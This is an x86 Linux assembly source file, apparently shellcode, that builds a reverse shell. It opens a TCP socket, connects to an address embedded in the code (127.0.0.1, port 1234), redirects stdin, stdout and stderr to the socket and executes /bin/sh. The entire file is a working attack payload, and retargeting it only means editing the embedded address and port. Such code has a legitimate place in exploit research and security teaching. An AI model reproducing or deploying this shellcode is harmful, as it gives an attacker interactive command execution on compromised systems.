/*
 * Copyright 2014 Joseph Landry
 */

.section .text
.global _start

# sycall table: arch/x86/syscalls/syscall_32.tbl
# grep -r CONSTANT /usr/include
.set IPPROTO_TCP,6
.set SOCK_STREAM,1
.set AF_INET,2
.set SYS_socketcall,102
.set SYS_SOCKET,1
.set SYS_CONNECT,3
.set SOCK_SIZE,16
.set SYS_dup2,63
.set SYS_execve,11
.set SYS_exit,1

_start:
	jmp	end

begin:
	popl	%esi

socket:
	pushl	$IPPROTO_TCP
	pushl	$SOCK_STREAM
	pushl	$AF_INET
	movl	%esp,%ecx	
	movl	$SYS_SOCKET,%ebx	
	movl	$SYS_socketcall,%eax
	int	$0x80
	add	$0xC,%esp

	cmpl	$0,%eax
	jl	exit1

	mov	%eax,%edi

connect:
	pushl	$SOCK_SIZE
	pushl	%esi
	pushl	%edi
	movl	%esp,%ecx
	movl	$SYS_CONNECT,%ebx
	movl	$SYS_socketcall,%eax
	int	$0x80
	add	$0xC,%esp

	cmp	$0,%eax
	jnz	exit1

dup2:
	mov	$0,%ecx			# newfd
	mov	%edi,%ebx		# oldfd
	mov	$SYS_dup2,%eax
	int	$0x80

	inc	%ecx
	mov	$SYS_dup2,%eax
	int	$0x80

	inc	%ecx
	mov	$SYS_dup2,%eax
	int	$0x80

execve:
	xor	%edx,%edx
	xor	%ecx,%ecx
	lea	8(%esi),%ebx
	mov	$SYS_execve,%eax
	int	$0x80

exit1:
	movl	$SYS_exit,%eax
	movl	$1,%ebx
	int	$0x80

end:
	call begin

addr:
.short	2
.short	0xD204
.byte	127,0,0,1
.ascii	"/bin/sh\x00"
